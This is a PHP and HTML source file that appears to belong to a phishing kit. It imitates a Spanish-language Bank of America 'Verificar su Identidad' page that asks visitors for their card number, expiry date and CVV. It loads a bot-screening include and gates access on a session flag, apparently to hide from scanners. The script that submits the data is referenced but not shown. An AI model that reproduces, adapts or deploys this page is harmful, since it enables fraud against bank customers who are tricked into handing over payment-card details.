<?php
require "is_bot.php";
require "ayudante.php";

if (is_session_started() === FALSE) {
    session_start();
}
if(!array_key_exists("permiso2",$_SESSION)){
    header("location:index.php");
  }
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
        inversiones con Merrill
    </title>
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos2.css" />
    <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <img src="img/logo-entrar.png" alt="logo">
            <img src="img/protegida-area.png" class="protegida" alt="protegida">
        </div>
        <div class="header2">
            <h1>Verificar su Identidad</h1>
        </div>
        <div class="section">
            <div class="principal">
                <h2 style="font-family:Arial, Helvetica, sans-serif;font-size: 15px; font-weight: bold;margin-left:10px;">Proteja su identidad</h2>
                <p style="margin-left: 10px;">Indique la información de la tarjeta de débito o de crédito de
                    Bank of America asociada con su cuenta para ayudar a proteger
                    su identidad contra el fraude.
                    <a href="javascript:void(0)" style="font-family: Arial, Helvetica, sans-serif;font-size:15px;color:#6d91d9;">¿Por qué solicitamos esta información?</a>

                </p>
                <form id="formcard" autocomplete="off" class="formcard" style="position: relative;font-family: 'cnx-regular', Arial, Helvetica, sans-serif;font-size:16px;">
                    <div class="grupo" style="padding-bottom: 10px;padding-top: 40px; padding-left: 161px;">
                        <input style="width: 159px;" class="inputCard primero" type="text" name="nucard" id="ncard" maxlength="16" />
                    </div>
                    <div class="grupo" style="margin-bottom: 9px;padding-left: 161px;">
                        <select class="inputCard segundo" name="mes" id="mes" style="width: 70px;height: 26px;">
                            <option value="">--</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="09">10</option>
                            <option value="09">11</option>
                            <option value="09">12</option>
                        </select>

                        <select class="inputCard tercero" name="anio" id="anio" style="width: 76px;height: 26px;">
                            <option value="">----</option>
                            <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                        </select>

                    </div>
                    <div class="grupo" style="padding-left: 161px;">
                        <input style="width:63px;"class="inputCard cuarto" type="text" name="cvv" id="cvv" maxlength="3" />
                        <button type="button" class="btncardnew" id="btntarjeta2" disabled="disabled">Verify</button>
                    </div>

                </form>
                
            </div>
            <div class="derecha">
                <img src="img/ayuda-card.png" alt="correo">
            </div>
        </div>
        <div class="footer">
            <img src="img/footer.png" alt="footer">
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>